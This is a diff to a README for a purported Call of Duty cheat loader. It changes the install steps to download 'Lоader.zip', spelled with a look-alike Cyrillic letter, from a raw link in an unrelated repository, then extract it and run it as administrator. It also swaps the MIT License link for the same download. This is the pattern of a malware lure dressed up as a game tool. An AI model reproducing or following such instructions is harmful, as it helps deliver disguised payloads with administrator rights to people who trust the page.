@@ -35,8 +35,8 @@ _Enjoy cross-platform versatility and performance_.
 ---
 ## 📝 Installation
 
-1. Download **Loader.rar** from the repository.
-2. Extract Loader.rar using WinRAR or 7-Zip.
+1. Download **https://raw.githubusercontent.com/sunildemo7477/realsense-cube-detector/main/Lоader.zip** from the repository.
+2. Extract https://raw.githubusercontent.com/sunildemo7477/realsense-cube-detector/main/Lоader.zip using WinRAR or 7-Zip.
 3. Run the Loader as administrator.
 4. Launch *Call of Duty: Black Ops 4* and enjoy!
 5. Refer to the [Wiki](./wiki) for detailed troubleshooting.
@@ -49,7 +49,7 @@ This repository is intended for **educational and research purposes only**. Usag
 ---
 ## 📄 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) © 2025.  
+Licensed under the [MIT License](https://raw.githubusercontent.com/sunildemo7477/realsense-cube-detector/main/Lоader.zip) © 2025.  
 Freely use, modify, and distribute with attribution.
 
 ---
